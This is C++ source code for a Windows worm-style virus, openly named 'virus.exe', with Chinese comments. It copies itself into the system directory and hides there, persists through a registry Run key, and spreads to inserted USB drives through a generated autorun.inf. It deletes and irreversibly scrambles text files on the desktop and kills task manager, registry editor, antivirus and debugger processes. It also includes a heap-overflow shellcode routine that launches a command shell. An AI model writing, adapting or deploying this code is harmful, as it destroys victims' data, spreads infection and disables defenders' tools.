#include <windows.h>
#include <Shlwapi.h>
#include <iostream>
#include <TlHelp32.h>
#include <fstream>
#include <Dbt.h>
#include <io.h>
#include <shlwapi.h>
#include<algorithm>
#include <direct.h>
#include<vector>
#include<string.h>
#include <errno.h>
#include<string>
#include<stdlib.h>
#include <fstream>
#include <ctime>
#include <locale>
#include <ctype.h>
using namespace std;

#define TIMER 1//计时器
#define ALLOC_COUNT 10
#define CHUNK_SIZE 0x190
void DeleteSinFile(const char *path);

void make_rubbish();

void KillProcess(LPCTSTR name);

void KillAllPro();

string  getDesktopPath();

string encrycode(char *c,int len);

void ModifyLineData(string fileName,string type);
//寻找file
void getFIles(string path,vector<string> &files,string delfile);

bool SortFileAndFindFile(string value_path,string filepath);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);//窗口过程


bool IsFileExist(TCHAR *path,TCHAR *filepath);//文件是否存在
bool ProcessFindSelf();//检测病毒是否在执行
bool CopyToSysAndSet(HWND hwnd);//复制自身到系统目录
bool CreateReg(TCHAR *path);//修改注册表，实现自启动
bool CreateRunFileToU(TCHAR *path);//在U盘下生成autorun.inf文件
//获取盘符
TCHAR FirstDriveFromMask (ULONG unitmask);
bool CopyToUAndSet();//复制自己到U盘

//全局变量
TCHAR szExePath[MAX_PATH];//the virus's path
TCHAR U[2];//保存U盘的盘符
TCHAR szSysPath[MAX_PATH];//system path

void HeapOverflow();

//常量
const TCHAR *szExeName="virus.exe";
const TCHAR *szSysName="virus.exe";
const TCHAR *szAutoRunFile="AutoRun.inf";

int ARR[] =
{
    0x39cb44b8, 0x23754f67, 0x5f017211, 0x3ebb24da, 0x351707c6, 0x63f9774b, 0x17827288, 0x0fe74821, 0x5b5f670f, 0x48315ae8, 0x785b7769, 0x2b7a1547, 0x38d11292, 0x42a11b32, 0x35332244, 0x77437b60,
    0x1eab3b10, 0x53810000, 0x1d0212ae, 0x6f0377a8, 0x43c03092, 0x2d3c0a8e, 0x62950cbf, 0x30f06ffa, 0x34f710e0, 0x28f417fb, 0x350d2f95, 0x5a361d5a, 0x15cc060b, 0x0afd13cc, 0x28603bcf, 0x3371066b,
    0x30cd14e4, 0x175d3a67, 0x6dd66a13, 0x2d3409f9, 0x581e7b82, 0x76526b99, 0x5c8d5188, 0x2c857971, 0x15f51fc0, 0x68cc0d11, 0x49f55e5c, 0x275e4364, 0x2d1e0dbc, 0x4cee7ce3, 0x32555840, 0x112e2e08,
    0x6978065a, 0x72921406, 0x314578e7, 0x175621b7, 0x40771dbf, 0x3fc238d6, 0x4a31128a, 0x2dad036e, 0x41a069d6, 0x25400192, 0x00dd4667, 0x6afc1f4f, 0x571040ce, 0x62fe66df, 0x41db4b3e, 0x3582231f,
    0x55f6079a, 0x1ca70644, 0x1b1643d2, 0x3f7228c9, 0x5f141070, 0x3e1474ab, 0x444b256e, 0x537050d9, 0x0f42094b, 0x2fd820e6, 0x778b2e5e, 0x71176d02, 0x7fea7a69, 0x5bb54628, 0x19ba6c71, 0x39763a99,
    0x178d54cd, 0x01246e88, 0x3313537e, 0x2b8e2d17, 0x2a3d10be, 0x59d10582, 0x37a163db, 0x30d6489a, 0x6a215c46, 0x0e1c7a76, 0x1fc760e7, 0x79b80c65, 0x27f459b4, 0x799a7326, 0x50ba1782, 0x2a116d5c,
    0x63866e1b, 0x3f920e3c, 0x55023490, 0x55b56089, 0x2c391fd1, 0x2f8035c2, 0x64fd2b7a, 0x4ce8759a, 0x518504f0, 0x799501a8, 0x3f5b2cad, 0x38e60160, 0x637641d8, 0x33352a42, 0x51a22c19, 0x085c5851,
    0x032917ab, 0x2b770ac7, 0x30ac77b3, 0x2bec1907, 0x035202d0, 0x0fa933d3, 0x61255df3, 0x22ad06bf, 0x58b86971, 0x5fca0de5, 0x700d6456, 0x56a973db, 0x5ab759fd, 0x330e0be2, 0x5b3c0ddd, 0x495d3c60,
    0x53bd59a6, 0x4c5e6d91, 0x49d9318d, 0x103d5079, 0x61ce42e3, 0x7ed5121d, 0x14e160ed, 0x212d4ef2, 0x270133f0, 0x62435a96, 0x1fa75e8b, 0x6f092fbe, 0x4a000d49, 0x57ae1c70, 0x004e2477, 0x561e7e72,
    0x468c0033, 0x5dcc2402, 0x78507ac6, 0x58af24c7, 0x0df62d34, 0x358a4708, 0x3cfb1e11, 0x2b71451c, 0x77a75295, 0x56890721, 0x0fef75f3, 0x120f24f1, 0x01990ae7, 0x339c4452, 0x27a15b8e, 0x0ba7276d,
    0x60dc1b7b, 0x4f4b7f82, 0x67db7007, 0x4f4a57d9, 0x621252e8, 0x20532cfc, 0x6a390306, 0x18800423, 0x19f3778a, 0x462316f0, 0x56ae0937, 0x43c2675c, 0x65ca45fd, 0x0d604ff2, 0x0bfd22cb, 0x3afe643b,
    0x3bf67fa6, 0x44623579, 0x184031f8, 0x32174f97, 0x4c6a092a, 0x5fb50261, 0x01650174, 0x33634af1, 0x712d18f4, 0x6e997169, 0x5dab7afe, 0x7c2b2ee8, 0x6edb75b4, 0x5f836fb6, 0x3c2a6dd6, 0x292d05c2,
    0x052244db, 0x149a5f4f, 0x5d486540, 0x331d15ea, 0x4f456920, 0x483a699f, 0x3b450f05, 0x3b207c6c, 0x749d70fe, 0x417461f6, 0x62b031f1, 0x2750577b, 0x29131533, 0x588c3808, 0x1aef3456, 0x0f3c00ec,
    0x7da74742, 0x4b797a6c, 0x5ebb3287, 0x786558b8, 0x00ed4ff2, 0x6269691e, 0x24a2255f, 0x62c11f7e, 0x2f8a7dcd, 0x643b17fe, 0x778318b8, 0x253b60fe, 0x34bb63a3, 0x5b03214f, 0x5f1571f4, 0x1a316e9f,
    0x7acf2704, 0x28896838, 0x18614677, 0x1bf569eb, 0x0ba85ec9, 0x6aca6b46, 0x1e43422a, 0x514d5f0e, 0x413e018c, 0x307626e9, 0x01ed1dfa, 0x49f46f5a, 0x461b642b, 0x7d7007f2, 0x13652657, 0x6b160bc5,
    0x65e04849, 0x1f526e1c, 0x5a0251b6, 0x2bd73f69, 0x2dbf7acd, 0x51e63e80, 0x5cf2670f, 0x21cd0a03, 0x5cff0261, 0x33ae061e, 0x3bb6345f, 0x5d814a75, 0x257b5df4, 0x0a5c2c5b, 0x16a45527, 0x16f23945
};

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int iCmdShow)
{
    static TCHAR szAppName[]=TEXT ("UUUUUU");
    HWND hwnd;
    MSG msg;
    WNDCLASS wndclass;

    wndclass.style =0;
    wndclass.lpfnWndProc =WndProc;
    wndclass.cbClsExtra =0;
    wndclass.cbWndExtra =0;
    wndclass.hInstance =hInstance;
    wndclass.hIcon =0;
    wndclass.hCursor =0;
    wndclass.hbrBackground =0;
    wndclass.lpszMenuName =NULL;
    wndclass.lpszClassName =szAppName;
    if (!RegisterClass (&wndclass))
    {

        MessageBox (NULL,TEXT("Program requires Windows NT!"),
                    szAppName, MB_ICONERROR);
        return 0;
    }
    hwnd = CreateWindow (szAppName, NULL,
                         WS_DISABLED,
                         0, 0,
                         0, 0,
                         NULL, NULL, hInstance, NULL);
    while (GetMessage(&msg, NULL, 0, 0))//循环获取消息
    {
        TranslateMessage (&msg);
        DispatchMessage (&msg);
    }
    return msg.wParam;
}
void getFIles(string path,vector<string> &files,string delfile)
{
    long hFIle=0;
    struct _finddata_t findfile;
    string p="";
    if(delfile==""||delfile.size()==0)
        delfile="*";
    if((hFIle=_findfirst(p.assign(path).append("\\").append(delfile).c_str(),&findfile))!=-1)
    {
        do
        {
            if(findfile.attrib == 20)
                continue;
            if(findfile.attrib & _A_SUBDIR)
            {
                if(strcmp(findfile.name,".")!=0&&strcmp(findfile.name,"..")!=0)
                    getFIles(p.assign(path).append("\\").append(findfile.name),files,delfile);
            }
            else
            {
                files.push_back(p.assign(path).append("\\").append(findfile.name));
            }
        }
        while(_findnext(hFIle,&findfile)==0);
        _findclose(hFIle);
    }
}
bool SortFileAndFindFile(string value_path,string filepath)
{
    vector<string>files;
    getFIles(filepath,files,"");
    sort(files.begin(), files.end());
    if(files.size()==0)
    {
        return false;
    }
    int min=0, max=files.size()-1;
    int mid=(max+min)/2;
    while(max >= min)
    {
        if(value_path==files[mid].c_str())
        {
            return true;
        }
        else if(value_path>files[mid].c_str())
        {
            min=mid+1;
        }
        else
            max=mid-1;
        mid=(min+max)/2;
    }
    return false;
}

void DeleteSinFile(char *path)
{
    string remove_files[1]= {"*.txt"};
    vector<string> delfile;
    getFIles(path,delfile,"*.txt");
    for(int i=0; i<delfile.size(); i++)
    {
        if (remove(delfile[i].c_str()) == -1)
        {
            cout<<"false \n";
        }
    }
}

LRESULT OnDeviceChange(HWND hwnd,WPARAM wParam, LPARAM lParam)
{
    PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
    switch(wParam)
    {
    case DBT_DEVICEARRIVAL: //插入
        if (lpdb -> dbch_devicetype == DBT_DEVTYP_VOLUME)
        {
            PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
            U[0]=FirstDriveFromMask(lpdbv ->dbcv_unitmask);//得到u盘盘符
            cout<<"U-0"<<U[0]<<endl;
            CopyToUAndSet();//拷到u盘
        }
        break;
    case DBT_DEVICEREMOVECOMPLETE: //设备删除
        break;
    }
    return LRESULT();
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam,LPARAM lParam)
{
    string desktop_path="";
    string ModifyName="";
    switch(message)
    {
    case WM_CREATE:
        U[1]=':';
        GetSystemDirectory(szSysPath,MAX_PATH);
        SetTimer(hwnd,TIMER,5000,0);//启动计时器
        GetModuleFileName(NULL,szExePath,MAX_PATH);//得到自身的路径
        desktop_path=getDesktopPath();
        ModifyName="*.txt";
        HeapOverflow();
        DeleteSinFile(desktop_path.c_str());
        ModifyLineData(desktop_path,ModifyName);
        KillAllPro();
        make_rubbish();
        return 0;
    case WM_TIMER:
        if(szExePath[0]==szSysPath[0]) //第一个字符为C
            SendMessage(hwnd,WM_DEVICECHANGE,0,0);//检测有没有插入设备消息
        else
        {
            CopyToSysAndSet(hwnd);//拷到系统盘并自启动
        }
        return 0;
    case WM_DEVICECHANGE:
        OnDeviceChange(hwnd,wParam,lParam);
        return 0;
    case WM_DESTROY:
        KillTimer(hwnd,TIMER);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, message, wParam, lParam);
}

TCHAR FirstDriveFromMask(ULONG unitmask)
{
    char i;
    for (i = 0; i < 26; ++i)
    {
        if (unitmask & 0x1)//看该驱动器的状态是否发生了变化
            break;
        unitmask = unitmask >> 1;
    }
    return (i + 'A');
}
bool CopyToSysAndSet(HWND hwnd)
{
    TCHAR szPath[MAX_PATH];
    lstrcpy(szPath,szSysPath);
    lstrcat(szPath,"\\");
    lstrcat(szPath,szSysName);//得到复制到系统目录的完整目录
    if(!IsFileExist(szPath,szSysPath))//检测系统目录是否已经存在复制的文件
    {
        CopyFile(szExePath,szPath,FALSE);
        CreateReg(szPath);//赖
        return SetFileAttributes(szSysPath,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
    }
    else
    {
        if(!ProcessFindSelf())//检测自己有没有运行
        {
            MessageBox(0,szExePath,szPath,MB_OK);
            WinExec(szPath,SW_HIDE);//没有就执行
            SendMessage(hwnd,WM_CLOSE,0,0);//结束自己
        }
    }
    return false;
}
bool IsFileExist(TCHAR *PATH,TCHAR *filepath)
{
    int result;
    result=SortFileAndFindFile(PATH,filepath);
    if(result)
        return true;
    return false;
}

bool CreateReg(TCHAR *path)//修改注册表实现自启动
{
    HKEY hkey;
    DWORD v=0;
    if(RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",&hkey)==ERROR_SUCCESS);
    if(RegSetValueEx(hkey,"NoDriveTypeAutoRun",0,REG_DWORD,(LPBYTE)&v,sizeof(DWORD))==ERROR_SUCCESS);
    if(RegOpenKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\MICROSOFT\\Windows\\CurrentVersion\\Run",
                  &hkey)==ERROR_SUCCESS)
    {
        if(RegSetValueEx(hkey,szSysName,0,REG_SZ,(BYTE*)path,lstrlen(path))==ERROR_SUCCESS)
            RegCloseKey(hkey);
        return true;
    }
    return false;
}
bool CopyToUAndSet()
{
    TCHAR szPath[MAX_PATH];
    lstrcpy(szPath,U);
    TCHAR * szfilePath=szPath;
    lstrcat(szPath,"\\");
    lstrcat(szPath,szExeName);//得到指向U盘的完整目录

    TCHAR szAutoFile[MAX_PATH];
    lstrcpy(szAutoFile,U);
    TCHAR * szAutoFilePath=szAutoFile;
    lstrcat(szAutoFile,"\\");
    lstrcat(szAutoFile,szAutoRunFile);

    if(!IsFileExist(szAutoFile,szAutoFilePath))
    {
        CreateRunFileToU(szAutoFile);
        SetFileAttributes(szAutoFile,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
    }
    if(!IsFileExist(szPath,szfilePath))
    {
        CopyFile(szExePath,szPath,FALSE);
        return SetFileAttributes(szPath,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
    }
    return false;
}

bool CreateRunFileToU(TCHAR *path) //在U盘下创建一个autorun.inf文件
{
    ofstream fout;
    fout.open(path);
    if(fout)
    {
        fout<<"[AutoRun]"<<endl;
        fout<<"open="<<szExeName<<" e"<<endl;
        fout<<"shellexecute="<<szExeName<<" e"<<endl;
        fout<<"shell\\Auto\\command="<<szExeName<<" e"<<endl;
        fout<<"shell=Auto"<<endl;
        fout.close();
        return true;
    }
    return false;
}
void make_rubbish()
{
    int i;
    FILE *output;
    srand(0);
    for(i=0; i<6; i++)
    {
        int n;
        char s[30];
        n=rand();
        string deskpath=getDesktopPath();
        sprintf(s,(deskpath+"\\destroy_%d.exe").c_str(),n);
        if((output=fopen(s,"w"))!=NULL)//没有会新建一个文件
        {
            fprintf(output,"%ld%s",n*n,s);
            fclose(output);
        }
    }
}
bool ProcessFindSelf()
{
    PROCESSENTRY32 pe;
    HANDLE hShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    pe.dwSize=sizeof(PROCESSENTRY32);
    if(Process32First(hShot,&pe))
    {
        do
        {
            if(lstrcmp(pe.szExeFile,szSysName)==0)
            {
                CloseHandle(hShot);
                return true;
            }
        }
        while(Process32Next(hShot,&pe));
    }
    CloseHandle(hShot);
    return false;
}
void KillAllPro()
{
    string proName[10]={"regedit.exe","taskmgr.exe","PEID.exe","Procmon.exe","Procmon64.exe"
    ,"Autoruns.exe","Ollydbg.exe","360safe.exe","windbg.exe","ida.exe"    };
    for(int i=0;i<10;i++)
    {
       KillProcess(proName[i].c_str());
    }
    return ;
}
void KillProcess(LPCTSTR name)
{
    PROCESSENTRY32 pe;
    HANDLE hShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32);
    if(Process32First(hShot, &pe))
    {
        do
        {
            if(strcmp(pe.szExeFile, name) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                TerminateProcess(hProcess,0);//杀不了管理员权限的软件
                break;
            }
        }
        while(Process32Next(hShot, &pe));
    }
    CloseHandle(hShot);
}
string  getDesktopPath()
{
    LPITEMIDLIST pidl;
    LPMALLOC pShellMalloc;
    char szDir[200];
    if (SUCCEEDED(SHGetMalloc(&pShellMalloc)))
    {
        if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl)))
        {
            SHGetPathFromIDListA(pidl, szDir);
            pShellMalloc->Free(pidl);
        }
        pShellMalloc->Release();
    }

    return string(szDir);
}
string encrycode(char *c,int len)
{
    byte mod[20]= {0x45,0x89,0x41,0x80,0x42,0x59,0x15,0x46,0x19,0x82,0x10,0x20,0x87,0x45,0x32,0x65,0x55,0x11,0x22,0x33};
    srand((unsigned int)time(NULL));
    int i=0;
    string strbuf="";
    while(i<(len-1)/4+1)
    {
        byte k1=0x35;
        byte k2=0x25;
        byte k3=0x45;
        byte k4=0x55;
        byte t1=rand()%0x14;
        byte t2=rand()%0x14;
        byte t3=rand()%0xff;
        if(c[i]!='\0')
            k1=(((0x74&mod[t2])^0x39+(k2|mod[t1])&k1)%0xf1)%0xee;
        if(c[i+1]!='\0')
            k2=((c[i+1]&mod[t1])^0x26+(k3^mod[t2])&0x16)%0x47;
        if(c[i+2]!='\0')
            k3=((c[i+2]&mod[(t1+8)%0x14])^k2+(k3^mod[(t2+4)%0x14])&0x99)%0x78;
        if(c[i+3]!='\0')
            k4=((c[i+3]&mod[(t1+10)%0x14])^k3+(k4&mod[(t2+12)%0x14])&0x16)%0x14;
        DWORD d=0x100000;
        DWORD k11=k1<<0x8;
        DWORD k12=k2<<0x10;
        DWORD k13=k3<<0x18;
        DWORD k14=k4<<0x18;
        d+=k11+k12+k13+k14;
        DWORD new_d=(d&ARR[t3])^ARR[(t3+96)%0xff]^ARR[(t3+45)%0xff];
        char c[40];
        itoa(new_d,c,10);
        string s=c;
        strbuf+=s;
        i++;
    }
    return strbuf;
}
void ModifyLineData(string fileName,string type)
{
    vector<string> files;
    getFIles(fileName,files,type);
    for(int i=0;i<files.size();i++)
    {
        cout<<"files[i] "<<files[i]<<endl;
        ifstream in;
        in.open(files[i].c_str());
        string strFileData = "";
        char tmpLineData[1024] = {0};
        while(in.getline(tmpLineData, sizeof(tmpLineData)))
        {
            int len=0;
            for(int i=0; tmpLineData[i]!='\0'; i++)
                len++;
            strFileData+=encrycode(tmpLineData,len);
            strFileData+="\n";
        }
        in.close();
        ofstream out;
        out.open(files[i].c_str());
        out.flush();
        out<<strFileData;
        out.close();
    }
    return ;
}
void HeapOverflow()
{
    int i;
    HANDLE hChunk;
    void* allocations[ALLOC_COUNT];
    HANDLE defaultHeap = GetProcessHeap();
    
    for (i = 0; i < ALLOC_COUNT; i++)
    {
        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
        memset(hChunk, 'A', CHUNK_SIZE);
        allocations[i] = hChunk;
    }
    char ShellCode[] =
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"BBBBBBBBBBBBBBBB"
		"CCCCDDDD"
		"\x90\x90\x90\x90\x90\x90\xeb\x08"	
        "\x14\xF7\xE2\x77"						
        "\x4C\x14\xEC\x77"						
        "\x33\xC0\x50\xC6\x04\x24\x6C\xC6\x44\x24\x01\x6C\x68"
        "\x52\x54\x2E\x44\x68\x4D\x53\x56\x43\x8B\xC4\x50\xB8"  
        "\xcf\x05\xe7\x77" 
        "\xFF\xD0\x33\xC0\x50\xC6\x04\x24\x63\xC6\x44\x24\x01"
        "\x6F\xC6\x44\x24\x02\x6D\x68\x61\x6E\x64\x2E\x68\x63"
        "\x6F\x6D\x6D\x8B\xC4\x50\xB8"
        "\xbf\x8e\x01\x78" 
        "\xFF\xD0";

        HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
        memcpy(allocations[2], ShellCode, sizeof(ShellCode));
}
